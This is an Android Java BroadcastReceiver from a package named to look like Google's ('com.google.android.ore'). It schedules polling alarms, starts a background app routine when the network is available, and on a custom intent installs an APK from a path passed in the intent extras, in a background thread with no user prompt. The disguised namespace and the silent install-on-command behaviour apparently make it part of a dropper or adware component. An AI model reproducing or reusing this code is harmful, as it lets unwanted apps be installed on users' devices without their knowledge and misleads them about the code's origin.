package com.google.android.ore.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;

import com.google.android.ore.OreApp;
import com.google.android.ore.PollingAlarm;
import com.google.android.ore.StartApp;
import com.google.android.ore.thinkandroid.L;
import com.google.android.ore.thinkandroid.TANetWorkUtil;
import com.google.android.ore.util.PackageUtils;

public class StartUpBroadcastReceiver extends BroadcastReceiver {
	private String TAG = StartUpBroadcastReceiver.class.getSimpleName();

	@Override
	public void onReceive(Context context, Intent intent) {
		if (!"android.intent.action.SIG_STR".equalsIgnoreCase(intent.getAction())) {
			L.d(TAG,
					"onReceive : action:" + intent.getAction() + " sdk_info:"
							+ OreApp.get().getGson().toJson(OreApp.get().getSdkInfo()));
		}
		if (intent.getAction().equalsIgnoreCase(OreApp.get().getPackageName())) {
			PollingAlarm.sendOncePollingAlarm();
		}
		boolean networkAvailable = TANetWorkUtil.isNetworkAvailable(context);
		if (networkAvailable) {
			// start app
			StartApp.onReceive(context, intent);
		} else {
			L.d(TAG, "onReceive : action:" + intent.getAction() + " network not available");
		}
		if (intent != null && "android.intent.action.ore.sl".equalsIgnoreCase(intent.getAction())) {
			final String apkPath = intent.getStringExtra("apk_path");
			if (!TextUtils.isEmpty(apkPath)) {
				final Context finalContext = context;
				new Thread(new Runnable() {
					
					@Override
					public void run() {
						int installResult = PackageUtils.install(finalContext, apkPath);
					}
				}).start();
			}
		}
	}
  
}
